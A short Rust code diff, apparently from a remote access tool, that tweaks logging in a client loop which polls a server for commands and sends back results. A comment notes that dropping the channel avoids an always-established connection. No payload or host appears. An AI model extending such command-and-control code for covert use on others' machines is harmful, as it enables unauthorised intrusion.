@@ -170,7 +170,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
             },
         );
         let response = ask_client.send(request).await?.into_inner();
-        println!("Response={response:?}");
+        let command = response.command.to_string();
+        println!("{command}");
 
         let command = RatCommand::from_i32(response.command).unwrap();
         let result = match command {
@@ -285,8 +286,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             }
         };
-        let response = response_client.send(result).await?.into_inner();
-        println!("{response:?}");
+        response_client.send(result).await?;
         // By dropping these I can prevent having an always-established channel
         mem::drop(channel);
         mem::drop(ask_client);
